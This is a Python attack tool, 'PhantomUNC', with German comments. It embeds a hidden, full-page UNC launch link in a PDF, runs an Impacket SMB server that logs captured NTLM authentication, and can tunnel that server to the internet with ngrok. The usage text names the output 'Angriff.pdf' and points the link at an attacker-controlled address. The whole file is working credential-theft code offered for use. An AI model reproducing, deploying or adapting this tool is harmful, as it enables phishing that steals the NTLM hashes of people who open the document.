#!/usr/bin/env python3
import fitz
import os
import sys
import argparse
import datetime
import subprocess
import threading
import time
import shutil

# Farben
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

LOGFILE = "phantomunc.log"

def print_banner():
    banner = rf"""{RED}
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗██╗   ██╗███╗   ██╗ ██████╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║██║   ██║████╗  ██║██╔════╝
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║██║     
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
                                                                
    {BLUE}by ML-CyberSec – U Unified SMB-Link Generator & NTLM Capture Tool{RESET}
"""
    print(banner)

def log(msg):
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M]")
    with open(LOGFILE, "a") as f:
        f.write(f"{timestamp} {msg}\n")

def create_pdf(input_file, output_file, target_dir, unc_path):
    try:
        print(f"{YELLOW}📄 Erstelle PDF mit verstecktem UNC-Link...{RESET}")
        doc = fitz.open(input_file)
        page = doc[0]
        rect = fitz.Rect(0, 0, page.rect.width, page.rect.height)
        page.insert_link({
            "kind": fitz.LINK_LAUNCH,
            "from": rect,
            "file": unc_path
        })
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        output_path = os.path.join(target_dir, output_file)
        doc.save(output_path)
        doc.close()
        print(f"{GREEN}✅ PDF gespeichert: {output_path}{RESET}")
    except Exception as e:
        print(f"{RED}❌ Fehler bei PDF-Erstellung: {e}{RESET}")
        sys.exit(1)

def capture_smb_output(proc):
    try:
        for line in iter(proc.stdout.readline, b''):
            decoded = line.decode("utf-8", errors="ignore").strip()
            if "NTLM" in decoded or "AUTH" in decoded:
                print(f"{BLUE}📥 {decoded}{RESET}")
                log(f"SMB: {decoded}")
    except Exception as e:
        print(f"{RED}❌ Fehler beim SMB-Log-Capture: {e}{RESET}")

def start_smb_server(share, directory):
    print(f"{YELLOW}📡 Starte SMB-Server: Share={share}, Ordner={directory}{RESET}")
    if not os.path.exists(directory):
        os.makedirs(directory)

    command = [
        "sudo", "python3",
        "/usr/share/doc/python3-impacket/examples/smbserver.py",
        share, directory, "-smb2support"
    ]

    try:
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        threading.Thread(target=capture_smb_output, args=(proc,), daemon=True).start()
        log(f"SMB-Server gestartet: Share={share}, Ordner={directory}")
        return proc
    except Exception as e:
        print(f"{RED}❌ SMB-Server konnte nicht gestartet werden: {e}{RESET}")
        sys.exit(1)

def start_ngrok(port=445):
    print(f"{BLUE}🌐 Starte ngrok Tunnel für Port {port}...{RESET}")
    try:
        if not shutil.which("ngrok"):
            print(f"{RED}❌ ngrok nicht gefunden. Bitte installiere es und stelle sicher, dass es im PATH ist.{RESET}")
            sys.exit(1)

        ngrok_cmd = ["ngrok", "tcp", str(port)]
        ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(5)
        url_out = subprocess.check_output(["curl", "-s", "http://127.0.0.1:4040/api/tunnels"])
        url_str = url_out.decode()
        start = url_str.find("tcp://")
        end = url_str.find('"', start)
        public_url = url_str[start:end]
        unc_link = public_url.replace("tcp://", "").replace(":", "@")

        print(f"{GREEN}✅ Öffentlich erreichbarer UNC-Link: \\\\{unc_link}\\share{RESET}")
        log(f"ngrok gestartet: {public_url}")
        return ngrok_proc

    except Exception as e:
        print(f"{RED}❌ Fehler beim Starten von ngrok: {e}{RESET}")
        sys.exit(1)

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="PhantomUNC – Unified SMB-Link Generator & NTLM Capture Tool",
        epilog="""
Beispiel 1: Nur PDF erzeugen
  python3 phantomunc_server.py --build-pdf -in Original.pdf -out Angriff.pdf -D Output/ --unc "\\\\192.168.0.158\\share"

Beispiel 2: Komplettsetup mit ngrok + SMB-Server
  python3 phantomunc_server.py --build-pdf -in Original.pdf -out Angriff.pdf -D Output/ --use-ngrok --run-server -s share -d /tmp/loot
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("--build-pdf", action="store_true", help="PDF mit SMB-Link erzeugen")
    parser.add_argument("-in", dest="input_file", help="Pfad zur Eingabe-PDF")
    parser.add_argument("-out", help="Name der Zieldatei")
    parser.add_argument("-D", help="Zielverzeichnis")
    parser.add_argument("--unc", default="\\\\192.168.0.158\\share", help="UNC-Link für das PDF")

    parser.add_argument("--run-server", action="store_true", help="Starte SMB-Server zur Authentifizierung")
    parser.add_argument("-s", "--share", default="share", help="Name des Shares")
    parser.add_argument("-d", "--directory", default="/tmp/share", help="Ordner zur Freigabe")

    parser.add_argument("--use-ngrok", action="store_true", help="ngrok-Tunnel für SMB aktivieren")

    args = parser.parse_args()

    if args.build_pdf:
        if not args.input_file or not args.out or not args.D:
            print(f"{RED}❗ Bitte -in, -out und -D für PDF-Erstellung angeben!{RESET}")
            sys.exit(1)
        create_pdf(args.input_file, args.out, args.D, args.unc)

    ngrok_proc = None
    if args.use_ngrok:
        ngrok_proc = start_ngrok()

    smb_proc = None
    if args.run_server:
        smb_proc = start_smb_server(args.share, args.directory)

    if smb_proc or ngrok_proc:
        print(f"{BLUE}⏳ Warte auf Verbindungen... Logs in {LOGFILE}{RESET}")
        try:
            while True:
                time.sleep(2)
        except KeyboardInterrupt:
            print(f"{YELLOW}\n🛑 Beende Prozesse...{RESET}")
            if smb_proc: smb_proc.kill()
            if ngrok_proc: ngrok_proc.kill()
            print(f"{GREEN}✅ Alles gestoppt.{RESET}")


if __name__ == "__main__":
    main()